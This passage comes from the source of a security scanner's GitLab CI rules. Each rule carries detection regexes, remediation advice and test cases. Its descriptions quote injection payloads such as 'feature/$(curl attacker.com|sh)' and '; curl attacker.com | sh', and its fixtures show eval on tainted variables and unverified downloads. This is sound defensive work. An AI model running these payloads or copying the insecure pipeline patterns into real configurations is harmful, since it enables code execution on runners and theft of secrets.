    # everything in ``.gitignore`` (``.env`` files, downloaded credentials,
    # ``*.pem`` keys, ``.npmrc`` with tokens) — into the job artifact, which
    # is then downloadable per the project's artifact access level.  Distinct
    # from SEC9-GL-001 (which is about the access *level* on whatever paths
    # are collected): here the danger is *what* gets collected.  PathPattern
    # is used so ``cache: untracked: true`` (internal, not downloadable)
    # does not fire — only ``artifacts.untracked``.
    Rule(
        id="SEC9-GL-004",
        title="Artifacts collect untracked files (may sweep gitignored secrets)",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-9",
        review_needed=True,
        confidence="medium",
        finding_family="Artifact exposure",
        description=(
            "A job sets ``artifacts:untracked: true``, which uploads every file "
            "not tracked by Git — including everything matched by ``.gitignore``. "
            "Build trees routinely contain gitignored secrets at runtime: ``.env`` "
            "files, fetched deploy keys, ``.npmrc``/``.pypirc`` with tokens, and "
            "``*.pem`` material. With ``untracked: true`` these are bundled into the "
            "job artifact and become downloadable to anyone at the artifact's "
            "access level (anonymous, in a public project). Unlike SEC9-GL-001 "
            "(which grades the access *level*), this rule flags the broad, "
            "implicit *collection* set."
        ),
        pattern=PathPattern(
            path=r"artifacts\.untracked$",
            value=r"^['\"]?[Tt]rue['\"]?$",
        ),
        remediation=(
            "Collect artifacts by explicit path instead of sweeping untracked "
            "files:\n"
            "\n"
            "artifacts:\n"
            "  paths:\n"
            "    - dist/\n"
            "    - build/output.bin\n"
            "\n"
            "If you must keep ``untracked: true`` for generated build output, pair "
            "it with ``access: developer`` (or ``none``) and make sure no secret "
            "material is written into the working tree during the job."
        ),
        reference="https://docs.gitlab.com/ci/yaml/#artifactsuntracked",
        test_positive=[
            "build:\n  script:\n    - make\n  artifacts:\n    untracked: true",
            "test:\n  artifacts:\n    untracked: 'true'\n    paths:\n      - out/",
        ],
        test_negative=[
            "build:\n  artifacts:\n    untracked: false\n    paths:\n      - dist/",
            # cache: untracked is internal to the runner, not downloadable.
            "cache:\n  untracked: true\n  paths:\n    - .cache/",
            "build:\n  artifacts:\n    paths:\n      - dist/",
        ],
        stride=["I"],
        threat_narrative=(
            "``untracked: true`` is an allowlist inversion: instead of naming the "
            "files to publish, it publishes everything Git ignores. Any secret a "
            "job writes to the working tree (a fetched token, a generated kubeconfig, "
            "a decrypted key) is then captured into a downloadable artifact, where "
            "an attacker who can read job artifacts harvests it long after the job "
            "ends."
        ),
    ),
    Rule(
        id="SEC9-GL-002",
        title="Binary or script downloaded without checksum verification",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-9",
        description=(
            "Pipeline downloads a binary or script file using curl/wget and executes it "
            "without verifying a checksum (sha256sum, shasum, cosign, gpg). "
            "Compromised download sources can deliver malicious payloads that run with "
            "full access to CI/CD variables and deployment credentials."
        ),
        pattern=SequencePattern(
            # The archive extension must sit in an ``http(s)://`` URL token
            # with no intervening pipe or quote, so ``.tar.gz`` inside a
            # ``| jq`` filter string is not mistaken for a download.
            pattern_a=r"""(curl|wget)\s+[^\n|]*?https?://[^\s'"|)]+\.(sh|py|tar\.gz|tgz|zip|exe|bin|deb|rpm)\b""",
            absent_within=r"(sha256sum|sha512sum|shasum|md5sum|cosign\s+verify|gpg\s+--verify)",
            lookahead_lines=5,
            exclude=[r"^\s*#", r"\|\s*(bash|sh|zsh|python|perl)"],
        ),
        remediation=(
            "Verify checksums after downloading binaries:\n"
            "  - curl -fsSL -o tool.tar.gz https://example.com/tool-v1.0.tar.gz\n"
            "  - echo 'abc123def456...  tool.tar.gz' | sha256sum -c -\n"
            "  - tar xzf tool.tar.gz"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09:_Improper_Artifact_Integrity_Validation",
        test_positive=[
            "    - curl -fsSL -o tool.bin https://example.com/releases/v1.0/tool.bin\n    - chmod +x tool.bin && ./tool.bin --version",
            "    - wget -q https://example.com/installer.sh\n    - bash installer.sh",
        ],
        test_negative=[
            "    - curl -fsSL -o tool.tar.gz https://example.com/tool.tar.gz\n    - echo 'abc123  tool.tar.gz' | sha256sum -c -",
            "    - curl -o cosign https://github.com/sigstore/cosign/releases/download/v2.0.0/cosign-linux-amd64\n    - cosign verify-blob --signature cosign.sig artifact.tar.gz",
            # Metadata query: ``.tar.gz`` only appears inside the jq filter
            # string after the pipe — nothing is downloaded.
            "    - v=$(curl -s https://pypi.org/pypi/foo/json | jq -r '[.urls[].filename|select(endswith(\".tar.gz\"))]|last')",
        ],
        stride=["T"],
        threat_narrative=(
            "Downloading a binary or script without verifying its checksum allows a CDN "
            "compromise, DNS hijacking, or MITM attack to substitute a malicious payload. "
            "The pipeline executes attacker-controlled code with full access to the runner "
            "environment and all CI/CD variables before any integrity check can fire."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4: Poisoned Pipeline Execution — extended variable coverage
    # =========================================================================
    Rule(
        id="SEC4-GL-003",
        title="User-controlled ref/tag variable used unquoted in shell script",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "CI_COMMIT_REF_NAME, CI_COMMIT_TAG, or CI_BUILD_REF_NAME used unquoted "
            "in shell scripts. CI_COMMIT_REF_NAME is set from the branch or tag "
            "name triggering the pipeline — an attacker who can create branches "
            "can inject arbitrary shell via a crafted name "
            "(e.g. 'feature/$(curl attacker.com|sh)'). CI_COMMIT_TAG is "
            "attacker-controlled for projects that allow tag creation. "
            "CI_BUILD_REF_NAME is the deprecated alias for CI_COMMIT_REF_NAME "
            "and carries the same risk.\n\n"
            "Not included: CI_MERGE_REQUEST_SOURCE_BRANCH_SHA and other "
            "*_SHA variables. Those always hold 40-char hex commit hashes "
            "and cannot contain shell metacharacters, so unquoted usage "
            "has no injection surface regardless of who controlled the "
            "source branch (dogfood on gitlab.com/gitlab-org/gitlab-runner "
            "surfaced this FP; removed from the match set)."
        ),
        pattern=RegexPattern(
            match=r"\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?",
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?CI_",  # YAML key-value starting with $CI_
                r"^\s*[\w_]+:\s*'[^']*\$",  # YAML key-value with single-quoted string value
                r'^\s*[\w_]+:\s*"[^"]*\$',  # YAML key-value with double-quoted string value
                r"^\s*[\w_]+:\s+\S",  # YAML key-value with any unquoted value (not a shell list item)
                r"^\s*-?\s*if:",  # rules:if — GitLab engine evaluates, not shell
                # Double-quoted shell context anywhere on the line.
                r'"[^"]*\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?[^"]*"',
                # Single-quoted shell context anywhere on the line — `$VAR`
                # inside `'...'` is literal per POSIX sh §2.2.2.
                r"'[^']*\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?[^']*'",
                # Bash `[[ ]]` conditional — per Bash manual §3.2.5.2, word
                # splitting and pathname expansion are NOT performed on words
                # between `[[` and `]]`, so an unquoted variable reference
                # there cannot inject. Surfaced as a FP on
                # gitlab.com/gitlab-org/gitlab-runner `.gitlab/ci/release.yml`
                # where `if [[ $CI_COMMIT_REF_NAME =~ ^v[0-9]+ ]]` is safe.
                # `[^\n]` (not `[^\]]`) so character classes like `[0-9]+`
                # in the regex operand don't break the closing-`]]` match.
                r"\[\[[^\n]*\$\{?(CI_COMMIT_REF_NAME|CI_COMMIT_TAG|CI_BUILD_REF_NAME)\}?[^\n]*\]\]",
            ],
            heredoc_aware=True,
            # GitLab ``rules.*.if:`` is a tiny expression DSL evaluated
            # by the GitLab CI engine, NOT a shell.  Multi-line ``if: |``
            # block scalars in gitlabhq's `.gitlab/ci/rules.gitlab-ci.yml`
            # produced 7 of this rule's 7 FPs in the May-17 audit because
            # continuation lines like ``$CI_COMMIT_REF_NAME == ...`` sit
            # below an ``if: |`` opener that the same-line
            # ``^\s*-?\s*if:`` exclude cannot reach.  Mask the body.
            gitlab_if_block_aware=True,
        ),
        remediation=(
            "Double-quote the variable or sanitize before use:\n"
            '  - echo "$CI_COMMIT_REF_NAME"\n'
            "  # For labels/tags passed to external tools, sanitize:\n"
            '  - SAFE_REF="${CI_COMMIT_REF_NAME//[^a-zA-Z0-9._-]/}"\n'
            '  - docker tag image:latest "image:$SAFE_REF"'
        ),
        reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
        test_positive=[
            "    - docker tag image:latest image:$CI_COMMIT_REF_NAME",
            "    - git push origin $CI_COMMIT_TAG",
            "    - deploy.sh --version $CI_BUILD_REF_NAME",
        ],
        test_negative=[
            '    - docker tag image:latest "image:$CI_COMMIT_REF_NAME"',
            '    - git push origin "$CI_COMMIT_TAG"',
            "    # $CI_COMMIT_REF_NAME used for logging only",
            "    - if: $CI_COMMIT_REF_NAME == 'main'",
            # Bash [[ ]] conditional — word splitting disabled per Bash §3.2.5.2.
            "    - if [[ $CI_COMMIT_REF_NAME =~ ^v[0-9]+ ]]; then echo release; fi",
            "    - if [[ $CI_COMMIT_TAG == v* ]]; then echo tagged; fi",
            # SHA variable — 40-char hex, cannot contain shell metachars.
            "    - git log --format=%h $CI_MERGE_REQUEST_SOURCE_BRANCH_SHA",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Git tag and ref names are attacker-controlled strings that can contain shell "
            "metacharacters; when used unquoted in a script they provide a command "
            "injection path exploitable by any contributor who can create a tag or open a "
            "merge request. The injected commands execute with the GitLab runner's "
            "permissions and environment."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4 continued — eval on tainted input (closes FINDINGS §F-2)
    # =========================================================================
    Rule(
        id="SEC4-GL-006",
        title="eval/bash -c invoked on an attacker-controlled CI variable",
        severity=Severity.CRITICAL,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "`eval` (and the equivalent `bash -c` / `sh -c` one-shot forms) "
            "re-parses its argument AS SHELL SOURCE — quoting the variable "
            "does NOT help, because the quotes control how the value is "
            "delivered TO eval, not what eval does with it afterwards. "
            "When the argument is a GitLab predefined variable that an "
            "attacker can set (CI_COMMIT_MESSAGE, CI_COMMIT_BRANCH, "
            "CI_MERGE_REQUEST_TITLE, etc.), a commit message of "
            "`; curl attacker.com | sh` becomes executable shell during the "
            "build. This is a CRITICAL code-execution primitive distinct "
            "from the generic unquoted-variable class (SEC4-GL-001)."
        ),
        pattern=RegexPattern(
            # `eval` / `bash -c` / `sh -c` followed by a tainted CI
            # variable (with or without surrounding quotes — both are
            # unsafe). The string between command and variable can be
            # arbitrary (e.g. `eval "prefix $CI_COMMIT_MESSAGE"`).
            match=(
                r"\b(eval|bash\s+-c|sh\s+-c)\s+['\"]?[^'\"\n]*?"
                r"\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_BRANCH|CI_COMMIT_TAG|"
                r"CI_COMMIT_REF_NAME|CI_MERGE_REQUEST_TITLE|"
                r"CI_MERGE_REQUEST_DESCRIPTION|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?"
            ),
            exclude=[r"^\s*#"],
            heredoc_aware=True,
        ),
        remediation=(
            "Never pass tainted input to `eval` or `bash -c` / `sh -c`. "
            "If you need to run a command conditional on a CI variable, "
            "use `case` / explicit branching or sanitise the variable "
            "through a fixed allow-list first:\n"
            '  case "$CI_COMMIT_BRANCH" in\n'
            "    main) deploy production ;;\n"
            "    staging) deploy staging ;;\n"
            "  esac"
        ),
        reference="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/eval.html",
        test_positive=[
            '    - eval "$CI_COMMIT_MESSAGE"',
            "    - eval $CI_COMMIT_BRANCH",
            '    - bash -c "$CI_MERGE_REQUEST_TITLE"',
            '    - sh -c "do_thing $CI_COMMIT_TAG"',
        ],
        test_negative=[
            '    - echo "$CI_COMMIT_MESSAGE"',
            '    - deploy.sh "$CI_COMMIT_BRANCH"',
            # eval on a *constant* is a different issue (style, maybe, not security).
            '    - eval "$(ssh-agent -s)"',
            '    # - eval "$CI_COMMIT_MESSAGE"  (commented-out)',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "`eval` re-parses its argument as shell source. When the argument "
            "carries a GitLab CI variable the attacker can set — commit "
            "message, branch name, MR title — an attacker-chosen string "
            "including `;` or `$(...)` becomes directly-executable code in "
            "the runner, inheriting its token and filesystem access."
        ),
        incidents=[],
    ),
    # =========================================================================
    # CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
    # =========================================================================
    Rule(
        id="SEC5-GL-001",
        title="Deployment job targets an environment but lacks resource_group protection",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-5",
        description=(
            "A job deploys to a named environment (production, staging, etc.) but does not "
            "define a 'resource_group:' key. Without resource_group, multiple pipelines can "
            "run concurrent deployments to the same environment — leading to race conditions, "
            "partial state, or the outcome of a newer deploy being overwritten by an older one. "
            "resource_group serialises access to a shared resource across pipelines, acting as "
            "a pipeline-level mutex for deployment targets."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*environment:\s*(production|prod|staging|stage|live|release|preprod|pre-prod)\s*$",
            absent_within=r"resource_group\s*:",
            lookahead_lines=15,
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Add resource_group to serialise concurrent deployments:\n\n"
            "deploy_production:\n"
            "  environment: production\n"
            "  resource_group: production   # only one deploy runs at a time\n"
            "  when: manual\n"
            "  script:\n"
            "    - ./deploy.sh"
        ),
        reference="https://docs.gitlab.com/ci/resource_groups/",
        test_positive=[
            "deploy_prod:\n  stage: deploy\n  environment: production\n  script:\n    - ./deploy.sh",
            "ship:\n  environment: staging\n  script:\n    - make ship\n  when: manual",
        ],
        test_negative=[
            "deploy_prod:\n  environment: production\n  resource_group: production\n  script:\n    - ./deploy.sh",
            "build:\n  script:\n    - make build",
        ],
        stride=["T", "D"],
        threat_narrative=(
            "Without resource_group, multiple pipelines targeting the same deployment "
            "environment can run concurrently, causing race conditions where one deployment "
            "overwrites the state established by another or leaves the environment in an "
            "inconsistent state. This is the GitLab equivalent of missing "
            "disableConcurrentBuilds in Jenkins."
        ),
    ),
    # =========================================================================
    # CICD-SEC-1: Security gate silenced by allow_failure / manual gating — GAP-4
    # =========================================================================
    Rule(
        id="SEC1-GL-002",
        title="Security scanning job configured to allow failure or manual run - verify gating policy",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A job that runs security scanning tools (SAST, secret detection, dependency "
            "scanning, etc.) has 'allow_failure: true' or 'when: manual'. Note: GitLab's own bundled "
            "security-scanning templates (Security/SAST.gitlab-ci.yml, "
            "Security/Secret-Detection.gitlab-ci.yml, etc.) SHIP with allow_failure: true "
            "by default — the intended blocking mechanism is a Merge Request Approval "
            "Policy or Scan Result Policy, not the job's exit status. This rule flags "
            "non-gating scanning jobs so the reviewer can confirm that an approval/"
            "scan-result policy is in place; if you rely on the job exit code to gate "
            "merges, remove allow_failure: true and avoid making the job manual."
        ),
        pattern=ContextPattern(
            anchor=r"(allow_failure:\s*true|when:\s*manual)",
            requires=(
                r"(sast|secret[_-]detect|dependency[_-]scan|container[_-]scan"
                r"|license[_-]scan|dast|fuzz|security[_-]scan"
                r"|trivy|semgrep|gitleaks|bandit|snyk|sonarqube|sonarcloud|checkov|grype)"
            ),
            exclude=[r"^\s*#"],
            scope="job",  # Both allow_failure and tool reference are job-level
        ),
        remediation=(
            "Confirm that an MR Approval Policy or Scan Result Policy is enforcing the "
            "finding gate; GitLab's default scanning templates rely on those policies "
            "rather than on the job exit code (which is why allow_failure: true ships as "
            "the default). Manual security jobs require the same policy review because "
            "they do not block by default unless a separate approval or scan-result policy "
            "requires them.\n"
            "\n"
            "If you have NOT configured a scan-result policy and you want the pipeline "
            "itself to fail on findings, remove 'allow_failure: true', avoid 'when: manual', "
            "and tune the scanner's configuration (e.g. severity thresholds, suppressions) "
            "to manage false-positive noise rather than silencing the job.\n"
            "\n"
            "Scan Result Policies: Security & Compliance > Policies in the project."
        ),
        reference="https://docs.gitlab.com/user/application_security/policies/",
        test_positive=[
            "sast:\n  stage: test\n  script:\n    - semgrep --config=auto .\n  allow_failure: true",
            "secret-detection:\n  stage: security\n  image: registry.gitlab.com/security-products/secret-detection:4\n  script:\n    - /analyzer run\n  allow_failure: true",
            "trivy-scan:\n  stage: security\n  script:\n    - trivy image $CI_REGISTRY_IMAGE\n  allow_failure: true",
            "sast:\n  stage: security\n  script:\n    - semgrep --config=auto .\n  when: manual",
            "dependency_scanning:\n  stage: security\n  script:\n    - /analyzer run\n  when: manual",
        ],
        test_negative=[
            # allow_failure on a non-security job is fine
            "flaky-test:\n  stage: test\n  script:\n    - pytest tests/flaky/\n  allow_failure: true",
            # Manual deploy/release approval is not a security scanner being weakened.
            "deploy-prod:\n  stage: deploy\n  script:\n    - ./deploy.sh\n  when: manual",
            # Security scan without allow_failure is fine (gate is enforced)
            "sast:\n  stage: test\n  script:\n    - semgrep --config=auto .",
            # Commented-out allow_failure
            "sast:\n  stage: test\n  script:\n    - semgrep --config=auto .\n  # allow_failure: true",
        ],
        stride=["E", "S"],
        threat_narrative=(
            "allow_failure: true on a security scan makes the gate silently pass even when "
            "critical vulnerabilities are detected, giving the appearance of compliance "
            "without the enforcement. An attacker who knows the gate is bypassed can "
            "introduce malicious code that would normally be caught, confident it will not "
            "block the pipeline."
        ),
    ),
    # =========================================================================
    # CICD-SEC-1: Security scanner disabled by protected CI variable.
    # =========================================================================
    Rule(
        id="SEC1-GL-003",
        title="GitLab security scanner disabled through CI variable",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A GitLab CI variables block sets a built-in security scanner disable "
            "switch, such as SAST_DISABLED or SECRET_DETECTION_DISABLED, to a truthy "
            "value. GitLab documents these variables as disabling the corresponding "
            "security jobs when set to true, so a pipeline can appear to include the "
            "scanner template while silently skipping the scan."
        ),
        pattern=PathPattern(
            path=(
                r"(^|\.)variables\."
                r"(SAST_DISABLED|SECRET_DETECTION_DISABLED|DEPENDENCY_SCANNING_DISABLED"
                r"|CONTAINER_SCANNING_DISABLED|DAST_DISABLED)$"
            ),
            value=r"(?i)^(true|1|yes)$",
        ),
        remediation=(
            "Remove the disabling CI variable and tune the scanner with documented "
            "configuration, scan execution policies, or rule suppressions instead. If a "
            "scanner must be disabled temporarily, require an explicit approval path and "
            "track the exception outside the pipeline YAML."
        ),
        reference="https://docs.gitlab.com/topics/autodevops/cicd_variables/",
        test_positive=[
            'variables:\n  SAST_DISABLED: "true"',
            "secret_scan:\n  variables:\n    SECRET_DETECTION_DISABLED: true\n  script:\n    - echo scan",
            'variables:\n  DEPENDENCY_SCANNING_DISABLED: "1"',
            "variables:\n  DAST_DISABLED: yes",
        ],
        test_negative=[
            'variables:\n  SAST_DISABLED: "false"',
            'variables:\n  SECRET_DETECTION_DISABLED: "0"',
            'variables:\n  FEATURE_FLAG_DISABLED: "true"',
            "debug:\n  script:\n    - echo 'SAST_DISABLED: true'",
        ],
        stride=["E", "S"],
        threat_narrative=(
            "Disabling GitLab's built-in security scanners through CI variables turns "
            "a required security gate into a no-op while leaving the pipeline structure "
            "looking compliant. An attacker or careless change can suppress SAST, secret "
            "detection, dependency scanning, container scanning, or DAST without removing "
            "the template include that reviewers expect to enforce the gate."
        ),
    ),
    # =========================================================================
    # SEC4-GL-007: Security gate keyed on a spoofable GitLab identity field.
    # GitLab port of SEC4-GH-010.  The GL analog of ``github.actor`` is
    # ``$GITLAB_USER_LOGIN`` / ``$GITLAB_USER_NAME`` / ``$GITLAB_USER_ID``
    # — the identity of the user who TRIGGERED the pipeline, which is
    # NOT the same as the MR author.  An attacker who opens a benign MR,
    # waits for a trusted maintainer to re-trigger the pipeline (via a
    # "Retry" button, a push, a fresh CI variable), then pushes a
    # follow-up commit inherits the maintainer's trust level for the
    # NEW run.  Same confused-deputy shape as the GitHub Dependabot-
    # auto-merge bypass.
    # =========================================================================
    Rule(
        id="SEC4-GL-007",
        title="Security gate uses spoofable $GITLAB_USER_* bot / maintainer check",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A pipeline ``rules:`` / ``if:`` condition keys access "
            "control on ``$GITLAB_USER_LOGIN`` / ``$GITLAB_USER_NAME`` "
            "/ ``$GITLAB_USER_ID`` — the identity of the user who "
            "triggered THIS run, not the MR author.  An attacker who "
            "opens a benign MR can wait for a maintainer's retry / "
            "re-run and then push a follow-up commit; the next "
            "pipeline inherits the maintainer's identity for the "
            "trigger context and the gate silently passes.  Distinct "
            "from SEC2-GL-001 (credentials) and TAINT-GL-001 "
            "(injection) — this is an access-control bypass class, "
            "analogous to ``github.actor`` on GitHub.  Use the MR "
            "author / committer identity instead, or gate on a ref "
            "that only the intended actor can push."
        ),
        pattern=GitlabIdentityGatePattern(),
        remediation=(
            "Use the MR author / source-project identity rather than "
            "the trigger actor.  ``$CI_MERGE_REQUEST_AUTHOR`` (GitLab "
            "15.5+) gives the MR author; "
            "``$CI_MERGE_REQUEST_SOURCE_PROJECT_ID`` + "
            "``$CI_PROJECT_ID`` identifies fork-vs-same-project MRs.\n"
            "\n"
            "# BAD — spoofable by maintainer retry + attacker push\n"
            "rules:\n"
            "  - if: '$GITLAB_USER_LOGIN == \"trusted-bot\"'\n"
            "    when: on_success\n"
            "\n"
            "# GOOD — same-project MRs only\n"
            "rules:\n"
            "  - if: '$CI_MERGE_REQUEST_SOURCE_PROJECT_ID == $CI_PROJECT_ID'\n"
            "    when: on_success\n"
            "  - when: never\n"
            "\n"
            "For automated-bot approvals, gate on a protected branch\n"
            "or environment — which requires a CI variable the attacker\n"
            "can't fake — not on a string equality against a username."
        ),
        reference=("https://docs.gitlab.com/ci/variables/predefined_variables/"),
        test_positive=[
            "    - if: '$GITLAB_USER_LOGIN == \"dependabot\"'",
            "  rules:\n    - if: $GITLAB_USER_NAME == 'renovate-bot'",
            "    - if: '$GITLAB_USER_ID == 42'",
            "    - if: '$GITLAB_USER_EMAIL =~ /bot@/'",
            # GRANT rule (explicit when: on_success) keyed on the spoofable
            # identity is still the confused-deputy vector — must fire.
            "  rules:\n    - if: '$GITLAB_USER_LOGIN == \"trusted-bot\"'\n      when: on_success",
        ],
        test_negative=[
            "    - if: '$CI_MERGE_REQUEST_AUTHOR == \"dependabot\"'",
            "    - if: $CI_MERGE_REQUEST_SOURCE_PROJECT_ID == $CI_PROJECT_ID",
            "    # - if: '$GITLAB_USER_LOGIN == \"bot\"'",
            # DENY gate (when: never) keyed on the identity is DEFENSIVE — it
            # withholds execution and grants nothing to a spoofed actor, so it
            # must NOT fire.
            "  rules:\n    - if: '$GITLAB_USER_LOGIN == \"release-bot\"'\n      when: never",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "``$GITLAB_USER_*`` reflects the user who TRIGGERED the "
            "pipeline, not the MR author.  An attacker who opens a "
            "benign MR and waits for a trusted maintainer's retry, "
            "then pushes a follow-up commit, inherits the maintainer's "
            "identity for the new run.  The same confused-deputy "
            "pattern exploited Dependabot auto-merge on GitHub (via "
            "``github.actor``) — GitLab's actor-keyed gates have the "
            "same structural flaw."
        ),
        incidents=[
            "Dependabot auto-merge bypass class (GH analog)",
        ],
    ),
    # =========================================================================
    # SEC4-GL-011 — CI_MERGE_REQUEST_LABELS used as a security gate.
    # Sibling of SEC4-GL-007 ($GITLAB_USER_* gate).  MR labels are set by
    # the MR author — an attacker who opens a fork MR can apply any label
    # to their own MR (or a project member can be social-engineered into
    # labelling it), so a ``rules:if:`` that grants privileged execution
    # based on ``$CI_MERGE_REQUEST_LABELS =~ /safe-to-test/`` is a
    # spoofable gate.  CI_MERGE_REQUEST_LABELS is already a taint SOURCE
    # (gitlab_taint._TAINTED_VARS) when it flows into ``script:``; this is
    # the distinct access-control-gate misuse, not a script-injection.
    # =========================================================================
    Rule(
        id="SEC4-GL-011",
        title="Security gate uses attacker-settable CI_MERGE_REQUEST_LABELS",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A ``rules:`` / ``if:`` condition gates job execution on "
            "``$CI_MERGE_REQUEST_LABELS`` matching a TRUST-GRANTING label "
            "(``safe-to-test``, ``approved``, ``lgtm``, ``ok-to-test``, "
            "``ready-to-merge`` …). Merge-request labels are controlled by "
            "the MR author: anyone who can open an MR — including from a "
            "fork — can set the labels on their own MR, so a label is not a "
            "trustworthy authorization signal. This is the GitLab twin of "
            "GitHub's spoofable ``github.event.label.name`` gate (CodeQL's "
            "LabelCheck), and the same confused-deputy class as SEC4-GL-007 "
            "($GITLAB_USER_* gates). Scoped to trust-granting label names so "
            "it does not fire on the common, benign pattern of using labels "
            "to select a test matrix / pipeline variant "
            "(``=~ /run-in-ruby3/``, ``/quarantine/``)."
        ),
        pattern=RegexPattern(
            # Fire only when CI_MERGE_REQUEST_LABELS is compared against an
            # RHS containing a trust-GRANTING label keyword.  Behaviour-
            # selection labels (test matrix, quarantine, variant) do not
            # match, which is the dominant benign use in real pipelines.
            match=(
                r"\$\{?CI_MERGE_REQUEST_LABELS\}?\s*(?:==|!=|=~|!~)\s*"
                r"['\"/][^'\"\n]*?"
                r"(?:safe[\s_-]?to[\s_-]?(?:test|run|merge|deploy)"
                r"|ok[\s_-]?to[\s_-]?(?:test|run|merge)"
                r"|approved|lgtm|trusted"
                r"|ready[\s_-]?to[\s_-]?merge"
                r"|allow[\s_-]?ci|ci[\s_-]?ok|run[\s_-]?ci)"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Do not gate privileged execution on MR labels. Gate on "
            "fork-vs-same-project identity, which the MR author cannot "
            "fake:\n"
            "\n"
            "# BAD — author sets their own MR labels\n"
            "rules:\n"
            "  - if: '$CI_MERGE_REQUEST_LABELS =~ /safe-to-test/'\n"
            "    when: on_success\n"
            "\n"
            "# GOOD — same-project MRs only; forks skipped\n"
            "rules:\n"
            "  - if: '$CI_MERGE_REQUEST_SOURCE_PROJECT_ID == $CI_PROJECT_ID'\n"
            "    when: on_success\n"
            "  - when: never\n"
            "\n"
            "If you genuinely want a human-approval step, use a manual "
            "job (``when: manual``) on a protected environment — a "
            "maintainer's click is an authenticated action; a label is not."
        ),
        reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
        test_positive=[
            "    - if: '$CI_MERGE_REQUEST_LABELS =~ /safe-to-test/'",
            "  rules:\n    - if: $CI_MERGE_REQUEST_LABELS =~ /approved/",
            "    - if: '$CI_MERGE_REQUEST_LABELS == \"ci-ok\"'",
            "    - if: '$CI_MERGE_REQUEST_LABELS =~ /ready-to-merge/'",
        ],
        test_negative=[
            "    - if: '$CI_MERGE_REQUEST_SOURCE_PROJECT_ID == $CI_PROJECT_ID'",
            # Bare use in a script (no comparison) — that's TAINT-GL's
            # injection territory, not an access-control gate.
            '    - echo "$CI_MERGE_REQUEST_LABELS"',
            "    # - if: '$CI_MERGE_REQUEST_LABELS =~ /safe-to-test/'",
            # Behaviour-selection labels (test matrix / quarantine / variant)
            # are the dominant benign use and must NOT fire — these are the
            # real-corpus shapes from gitlab-org/gitlab.
            "    - if: '$CI_MERGE_REQUEST_LABELS =~ /pipeline:run-in-ruby3_3/'",
            "    - if: '$CI_MERGE_REQUEST_LABELS =~ /quarantine/'",
            "    - if: '$CI_MERGE_REQUEST_LABELS =~ /Community contribution/'",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "MR labels are author-controlled metadata. A gate keyed on "
            "``$CI_MERGE_REQUEST_LABELS`` lets an attacker self-apply the "
            "magic label on a fork MR and unlock whatever privileged job "
            "the label was meant to protect, executing fork code with the "
            "project's CI scope — the same bypass shape as label-gated "
            "``pull_request_target`` workflows on GitHub."
        ),
    ),
    # =========================================================================
    # SEC4-GL-010 — trigger:forward:pipeline_variables: true.
    # Forwards the parent pipeline's *manual* variables (which can carry
    # secrets passed at trigger time) into a downstream child / multi-
    # project pipeline. GitLab defaults ``forward:pipeline_variables`` to
    # FALSE precisely because forwarding them widens secret exposure — to
    # a child pipeline that may live in another project with a different
    # trust boundary and that drops the parent's masking guarantees.
    # Setting it ``true`` is an explicit opt-in worth a review.  No
    # existing rule inspects ``trigger:forward:``.
    # =========================================================================
    Rule(
        id="SEC4-GL-010",
        title="trigger:forward:pipeline_variables forwards parent variables downstream",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        review_needed=True,
        confidence="medium",
        description=(
            "A ``trigger:`` block sets ``forward: pipeline_variables: "
            "true``, forwarding the parent pipeline's manually-passed "
            "variables into the downstream (child or multi-project) "
            "pipeline. Manual pipeline variables frequently carry secrets "
            "supplied at trigger time; forwarding them sends those values "
            "across a pipeline boundary — potentially into a different "
            "project with a different set of maintainers — and the "
            "downstream pipeline does not inherit the parent's masking. "
            "GitLab defaults this to ``false`` for exactly this reason."
        ),
        pattern=RegexPattern(
            # ``pipeline_variables`` is a trigger:forward-only key in
            # GitLab CI, so a bare line match is low-FP.
            match=r"^\s*pipeline_variables:\s*[Tt]rue\b",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Leave ``forward:pipeline_variables`` at its default (false) "
            "and pass only the specific variables the downstream pipeline "
            "needs, explicitly, as non-secret values:\n"
            "\n"
            "trigger-child:\n"
            "  trigger:\n"
            "    include: child.gitlab-ci.yml\n"
            "    forward:\n"
            "      pipeline_variables: false   # default; manual vars stay in the parent\n"
            "\n"
            "If the child genuinely needs a secret, define it as a "
            "Masked + Protected CI/CD variable in the child project rather "
            "than forwarding it across the trigger boundary."
        ),
